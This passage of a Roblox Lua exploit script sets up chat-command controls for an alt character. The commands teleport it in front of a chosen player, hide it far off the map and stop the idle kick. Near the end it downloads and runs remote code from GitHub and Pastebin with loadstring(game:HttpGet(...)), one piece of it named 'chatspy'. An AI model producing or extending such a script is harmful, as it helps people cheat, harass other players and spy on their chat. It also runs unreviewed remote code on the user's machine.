            toggleAntiStomp(true)
        elseif command == ".unantistomp" then
            toggleAntiStomp(false)

        elseif command == ".cleanse" then
            startCleanse()
        elseif command == ".stopcleanse" then
            stopCleanse()
        elseif command == ".stop" then
            if isCleanseRunning then
                stopCleanse()
            end
            if randomVanishEnabled then
                randomVanishEnabled = false
                if randomVanishConnection then
                    randomVanishConnection:Disconnect()
                    randomVanishConnection = nil
                end
                local altCharacter = LocalPlayer.Character
                if altCharacter then
                    local altRootPart = altCharacter:FindFirstChild("HumanoidRootPart")
                    if altRootPart then
                        altRootPart.CFrame = CFrame.new(teleportPosition)
                    end
                end
                
            end
    elseif command == ".tpfront" then
        stopVanishIfActive()
        local targetPlayer = GetPlayerFromString(args[2])
        if not targetPlayer then
            return
        end
    
    local notification = Instance.new("ScreenGui")
    notification.Name = "TpFrontNotification"
    notification.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    
    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(0, 400, 0, 50)
    textLabel.Position = UDim2.new(0.5, -200, 0.1, 0)
    textLabel.BackgroundColor3 = Color3.new(0, 0, 0)
    textLabel.TextColor3 = Color3.new(1, 1, 1)
    textLabel.Text = "Teleporting in front of " .. targetPlayer.Name
    textLabel.Parent = notification
    
    if followConnection then
        followConnection:Disconnect()
        followConnection = nil
    end
    
    if isCleanseRunning then
        stopCleanse()
    end
    
    if randomVanishEnabled then
        randomVanishEnabled = false
        if randomVanishConnection then
            randomVanishConnection:Disconnect()
            randomVanishConnection = nil
        end
    end
    
    local tpFrontConnection = nil
    tpFrontConnection = RunService.Heartbeat:Connect(function()
        local localChar = LocalPlayer.Character
        if not localChar then return end
        
        local localHRP = localChar:FindFirstChild("HumanoidRootPart")
        if not localHRP then return end
        
        local targetChar = targetPlayer.Character
        if not targetChar then return end
        
        local targetHRP = targetChar:FindFirstChild("HumanoidRootPart")
        if not targetHRP then return end
        
        local lookVector = targetHRP.CFrame.LookVector
        local frontPosition = targetHRP.CFrame.Position + (lookVector * 3)
        
        localHRP.CFrame = CFrame.new(frontPosition, frontPosition + lookVector)
    end)
    
    _G.tpFrontConnection = tpFrontConnection
    
    task.wait(1.5)
    notification:Destroy()

elseif command == ".untpfront" then
    if _G.tpFrontConnection then
        _G.tpFrontConnection:Disconnect()
        _G.tpFrontConnection = nil
        
        local localChar = LocalPlayer.Character
        if localChar then
            local localHRP = localChar:FindFirstChild("HumanoidRootPart")
            if localHRP then
                localHRP.CFrame = CFrame.new(teleportPosition)
            end
        end
    end
        end
    end



local function setupChatListener()
    local TextChatService = game:GetService("TextChatService")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    
    if isNewChatSystem() then
        local success = pcall(function()
            TextChatService.MessageReceived:Connect(function(message)
                local textSource = message.TextSource
                if not textSource then return end

                local speakerName = textSource.Name
                local text = message.Text

                processCommand(speakerName, text)
            end)
        end)
        
        if success then
            return
        end
    end
    
    local DefaultChatEvents = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
    if DefaultChatEvents and DefaultChatEvents:FindFirstChild("OnMessageDoneFiltering") then
        DefaultChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(data)
            local speakerName = data.FromSpeaker
            local message = data.Message
            processCommand(speakerName, message)
        end)
    end
end

setupChatListener()


local vu = game:GetService("VirtualUser")
LocalPlayer.Idled:Connect(function()
    vu:Button2Down(Vector2.new(1, 0), workspace.CurrentCamera.CFrame)
    task.wait(1)
    vu:Button2Up(Vector2.new(-1, 0), workspace.CurrentCamera.CFrame)
end)



game.Workspace.FallenPartsDestroyHeight = -9e9

local safetyPlat1 = Instance.new("Part")
safetyPlat1.Size = Vector3.new(100, 2, 100)
safetyPlat1.Name = "SafetyPlat1"
safetyPlat1.Parent = game.Workspace
safetyPlat1.Anchored = true
safetyPlat1.Position = Vector3.new(-897.660, -3550.072, -709.876)

local localCharacter = LocalPlayer.Character
local humanoidRootPart = localCharacter and localCharacter:FindFirstChild("HumanoidRootPart")
if humanoidRootPart then
    humanoidRootPart.CFrame = CFrame.new(-897.660, -3540.072, -709.876)
    humanoidRootPart.Velocity = Vector3.new(0, 0, 0)
end

local safetyPlat2 = Instance.new("Part")
safetyPlat2.Size = Vector3.new(100, 2, 100)
safetyPlat2.Name = "SafetyPlat2"
safetyPlat2.Parent = game.Workspace
safetyPlat2.Anchored = true
safetyPlat2.Position = Vector3.new(0, 9999999999, 0)

loadstring(game:HttpGet("https://raw.githubusercontent.com/frvaunted/a/main/chatspy", true))()
loadstring(game:HttpGet("https://pastebin.com/raw/iAgXX4t2", true))()


repeat wait() until game:IsLoaded()

local function onCharacterRespawn(character)
    local plr = game.Players.LocalPlayer
    local char = plr.Character or plr.CharacterAdded:Wait()
    local hrp = char:WaitForChild("HumanoidRootPart", 5)
    if hrp then
        hrp.CFrame = CFrame.new(-897.660, -3540.072, -709.876)
    end
end

game.Players.LocalPlayer.CharacterAdded:Connect(onCharacterRespawn)

print("v3")
